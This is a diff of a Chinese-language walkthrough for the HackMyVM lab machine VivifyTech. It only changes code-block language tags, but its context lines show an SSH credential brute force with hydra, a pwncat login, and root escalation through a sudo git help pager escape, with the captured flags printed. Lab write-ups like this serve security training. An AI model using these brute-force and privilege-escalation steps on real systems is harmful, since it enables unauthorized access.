@@ -215,7 +215,7 @@ sancelisso
 
 尝试使用已得到的信息进行爆破凭据
 
-```shell
+```bash
 ┌─[randark@parrot]─[~/tmp]
 └──╼ $hydra -L user.txt -P secret.txt 192.168.56.103 ssh
 ......
@@ -225,7 +225,7 @@ sancelisso
 
 ## User - sarah
 
-```shell
+```bash
 ┌─[randark@parrot]─[~/tmp]
 └──╼ $pwncat-cs sarah@192.168.56.103
 [19:59:22] Welcome to pwncat
@@ -239,7 +239,7 @@ sarah
 
 ### flag - user
 
-```shell
+```bash
 (remote) sarah@VivifyTech:/home/sarah$ cat user.txt
 HMV{Y0u_G07_Th15_0ne_6543}
 ```
@@ -265,7 +265,7 @@ define('DB_HOST', 'localhost');
 
 尝试连接
 
-```shell
+```bash
 mysql> show databases;
 +--------------------+
 | Database           |
@@ -317,7 +317,7 @@ User gbodja may run the following commands on VivifyTech:
 
 尝试利用 git 提权
 
-```shell
+```bash
 gbodja@VivifyTech:~$ sudo -u root /usr/bin/git help config
 # # https://gtfobins.github.io/gtfobins/git/
 # whoami
@@ -328,7 +328,7 @@ root
 
 ### flag - root
 
-```shell
+```bash
 # cat root.txt
 HMV{Y4NV!7Ch3N1N_Y0u_4r3_7h3_R007_8672}
 ```
